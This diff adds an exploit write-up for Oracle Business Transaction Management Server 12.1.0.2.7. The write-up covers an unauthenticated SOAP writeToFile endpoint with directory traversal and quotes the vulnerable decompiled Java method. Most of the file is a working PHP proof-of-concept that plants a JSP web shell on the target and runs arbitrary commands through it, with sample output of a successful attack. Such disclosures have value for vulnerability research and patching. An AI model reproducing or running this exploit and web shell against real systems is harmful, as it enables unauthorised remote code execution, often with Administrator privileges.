@@ -1,0 +1,280 @@
+Oracle Business Transaction Management Server 12.1.0.2.7 FlashTunnelService 
+WriteToFile Message Remote Code Execution Exploit
+
+tested against: Microsoft Windows Server 2003 r2 sp2
+                Oracle WebLogic Server 12c (12.1.1)
+                Oracle Business Transaction Management Server 12.1.0.2.7 (Production version)
+
+files tested: 
+oepe-indigo-installer-12.1.1.0.1.201203120349-12.1.1-win32.exe (weblogic)
+download url: http://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html              
+
+BTM_Servers_12.1.0.2.7.zip (BTM, production version) 
+download url: http://www.oracle.com/technetwork/oem/downloads/btw-downloads-207704.html
+
+
+vulnerability:
+the mentioned product installs a web service 
+called "FlashTunnelService" which can be reached
+without prior authentication and processes incoming
+SOAP requests.
+
+It can be reached at the following uri:
+http://[host]:7001/btmui/soa/flash_svc/
+
+This soap interface exposes the writeToFile function
+which could allow to write arbitrary files on the target
+server.
+
+Example packet:
+
+POST /btmui/soa/flash_svc/ HTTP/1.1
+Accept-Encoding: gzip,deflate
+Content-Type: text/xml;charset=UTF-8
+SOAPAction: "http://soa.amberpoint.com/writeToFile"
+User-Agent: Jakarta Commons-HttpClient/3.1
+Host: 192.168.0.1:7001
+Content-Length: [length]
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:int="http://schemas.amberpoint.com/flashtunnel/interfaces" xmlns:typ="http://schemas.amberpoint.com/flashtunnel/types">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <int:writeToFileRequest>
+         <int:writeToFile handle="..\..\..\..\..\..\..\..\[path]\somefile.jsp">
+            <!--Zero or more repetitions:-->
+            <typ:text>[code]</typ:text>
+            <!--Optional:-->
+            <typ:WriteToFileRequestVersion>
+               <!--You may enter ANY elements at this point-->
+            </typ:WriteToFileRequestVersion>
+         </int:writeToFile>
+      </int:writeToFileRequest>
+   </soapenv:Body>
+</soapenv:Envelope>
+
+the 'handle' property can be used to control the location
+of the newly written file (it suffers of a directory traversal ulnerability).
+File extension can also be controlled.
+File content can be controlled through the 'text' element (note that one
+must convert the code to html entities firstly, the soap interface
+will reconvert it to his original format).
+
+Given this, a remote attacker, could place an arbitrary jsp script
+inside the main web server root path, then execute arbitrary code
+with the privileges of the weblogic installation, usually Administrator
+privileges).
+
+vulnerable code, see the decompiled com.amberpoint.flashtunnel.impl.FlashTunnelServiceImpl.class
+
+...
+public IWriteToFileResponse writeToFile(IWriteToFileRequest request)
+        throws SOAPFaultException
+    {
+        WriteToFileResponse wtfr = new WriteToFileResponse();
+        String handle = request.getHandle();
+        TypedList text = request.getText();
+        if(text != null && text.size() > 0)
+        {
+            File f = getFileFromHandle(handle);
+            if(f != null)
+                try
+                {
+                    FileOutputStream fos = new FileOutputStream(f);
+                    OutputStreamWriter osw = new OutputStreamWriter(fos, "UTF-8");
+                    int i = 0;
+                    for(int ii = text.size(); i < ii; i++)
+                    {
+                        String s = (String)text.get(i);
+                        osw.write(s);
+                        osw.write("\n");
+                    }
+
+                    osw.close();
+                }
+                catch(IOException ex)
+                {
+                    logger.log(Level.SEVERE, (new StringBuilder()).append("IOException writing '").append(f.toString()).append("': ").append(ex.getMessage()).toString());
+                }
+        }
+        return wtfr;
+    }
+...
+
+As attachment, proof of concept code written in php, launch from the command line, modify for your own use.
+
+<?php
+/*
+Oracle Business Transaction Management Server 12.1.0.2.7 FlashTunnelService 
+WriteToFile Message Remote Code Execution Exploit
+
+tested against: Microsoft Windows Server 2003 r2 sp2
+                Oracle WebLogic Server 12c (12.1.1)
+                Oracle Business Transaction Management Server 12.1.0.2.7 (Production version)
+
+Example:
+C:\php>php 9sg_ora.php 192.168.2.101 ver
+[*] Attacking...
+HTTP/1.1 200 OK
+Date: Mon, 09 Jul 2012 08:53:11 GMT
+Accept-Ranges: bytes
+Content-Length: 40
+Content-Type: text/plain
+Last-Modified: Mon, 09 Jul 2012 08:53:09 GMT
+X-Powered-By: Servlet/3.0 JSP/2.2
+
+
+Microsoft Windows [Version 5.2.3790]
+
+
+C:\php>php 9sg_ora.php 192.168.2.101 "start calc"
+
+
+rgod
+*/
+    error_reporting(E_ALL ^ E_NOTICE);     
+    set_time_limit(0);
+    
+	$err[0] = "[!] This script is intended to be launched from the cli!";
+    $err[1] = "[!] You need the curl extesion loaded!";
+
+    if (php_sapi_name() <> "cli") {
+        die($err[0]);
+    }
+    
+	function syntax() {
+       print("usage: php 9sg_ora.php [ip_address] [cmd]\r\n" );
+       die();
+    }
+    
+	$argv[2] ? print("[*] Attacking...\n") :
+    syntax();
+    
+	if (!extension_loaded('curl')) {
+        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
+        false;
+        if ($win) {
+            !dl("php_curl.dll") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        } else {
+            !dl("php_curl.so") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        }
+    }
+        
+    function _s($url, $is_post, $ck, $request) {
+        global $_use_proxy, $proxy_host, $proxy_port;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if ($is_post == 1) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
+        }
+        if ($is_post == 2) {
+            curl_setopt($ch, CURLOPT_PUT, 1); 
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
+        }
+        
+        curl_setopt($ch, CURLOPT_HEADER, 1);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "Content-Type: text/xml;charset=UTF-8",
+            "SOAPAction: \"http://soa.amberpoint.com/writeToFile\"",
+                      
+
+        )); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Jakarta Commons-HttpClient/3.1");
+        //curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        //curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
+         
+        if ($_use_proxy) {
+            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
+        }
+        $_d = curl_exec($ch);
+        if (curl_errno($ch)) {
+            //die("[!] ".curl_error($ch)."\n");
+        } else {
+            curl_close($ch);
+        }
+        return $_d;
+    }
+          $host = $argv[1];
+          $port = 7001;
+          $cmd = $argv[2];
+
+
+
+
+$code='<%@ page import="java.util.*,java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+String outstr = "";
+        try {
+                Runtime rt = Runtime.getRuntime();
+                Process p = rt.exec(cmd);
+                try {
+                         InputStreamReader ise = new InputStreamReader(p.getErrorStream());
+                         BufferedReader bre = new BufferedReader(ise);
+                         InputStreamReader iso = new InputStreamReader(p.getInputStream());
+                         BufferedReader bro = new BufferedReader(iso);
+                         String line=null;
+                         while ( (line = bre.readLine()) != null ) {
+                             System.out.println( line );
+                         }
+                         while ( (line = bro.readLine()) != null ) {
+                             System.out.println(line );
+                         }
+
+                } catch (IOException ioe)
+                {
+                        ioe.printStackTrace();  
+                }
+        }
+        catch (Throwable t) {
+                t.printStackTrace();
+        }
+
+%>
+';
+$code=htmlentities($code); //convert all to html entities, then no bad chars
+
+//we should write to:
+//C:\Oracle\Middleware\wlserver_12.1\samples\server\examples\build\mainWebApp\WEB-INF\classes\mainWebApp#\suntzu.jsp
+//C:\Oracle\Middleware\wlserver_12.1\samples\server\examples\build\mainWebApp\suntzu.jsp
+//change to a location of choice
+
+$path=array('\server\examples\build\mainWebApp',
+            '\server\examples\build\mainWebApp\WEB-INF\classes\mainWebApp#');
+
+
+for ($i=0; $i<count($path); $i++){
+$soap='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:int="http://schemas.amberpoint.com/flashtunnel/interfaces" xmlns:typ="http://schemas.amberpoint.com/flashtunnel/types">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <int:writeToFileRequest>
+         <int:writeToFile handle="..\..\..\..\..\..\..\..\..\..'.$path[$i].'\suntzu.jsp">
+            <typ:text>'.$code.'</typ:text>
+            <typ:WriteToFileRequestVersion>
+            </typ:WriteToFileRequestVersion>
+         </int:writeToFile>
+      </int:writeToFileRequest>
+   </soapenv:Body>
+</soapenv:Envelope>';
+
+$url = "http://$host:$port/btmui/soa/flash_svc/";
+$out = _s($url, 1, "", $soap);
+//print($out."\n");
+sleep(1);
+}
+
+$cmd="cmd.exe /c ".$cmd." > ../../server/examples/build/mainWebApp/sh.txt";
+$url = "http://$host:$port/suntzu.jsp?cmd=".urlencode($cmd);
+$out = _s($url, 0, "", "");
+//print($out."\n");
+
+sleep(2);
+
+$url = "http://$host:$port/sh.txt";
+$out = _s($url, 0, "", "");
+print($out."\n");
+?>
